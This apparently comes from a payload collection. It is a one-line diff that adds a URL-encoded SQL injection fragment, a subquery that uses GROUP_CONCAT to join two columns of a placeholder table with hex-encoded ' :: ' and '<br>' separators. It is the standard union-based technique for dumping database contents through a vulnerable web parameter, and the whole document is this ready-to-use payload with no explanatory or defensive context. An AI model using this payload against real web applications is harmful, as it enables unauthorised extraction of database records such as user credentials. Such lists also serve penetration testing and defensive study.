@@ -1,0 +1,1 @@
+(SELECT+GROUP_CONCAT(colum1,0x203a3a20,column2+SEPARATOR+0x3c62723e)+FROM+table_name)
